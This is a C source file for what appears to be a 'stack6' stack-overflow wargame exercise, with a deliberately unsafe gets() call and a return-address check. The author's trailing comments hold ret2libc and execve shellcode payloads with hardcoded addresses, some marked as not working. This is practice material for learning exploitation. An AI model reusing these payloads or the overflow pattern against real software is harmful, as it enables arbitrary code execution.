#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}

// Ret2Lib-stack --> python -c "print '/bin/ls\x00'+'\x00'*75+'\x60\xc0\xe3\xb7'+'\xf0\xfa\xe2\xb7'+'\x9c\xf0\xff\xbf'" | ./stack6.o -- No working?
// Ret2Lib-env --> python -c "print '/bin/ls\x00'+'\x00'*72+'\x60\xc0\xe3\xb7'+'\xf0\xfa\xe2\xb7'+'\x44\xfd\xff\xbf'" | ./stack6.o
// shellcode en EBP --> python -c "sc='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80';sc += 'A'*(76-len(sc)); sc += '\x1c\xf0\xff\xbf'; sc += '\x40\x85\x04\x08'; import sys; sys.stdout.write(sc)" --> Funcionaria si el main saliera con leave, pero no acaba asi el main:(

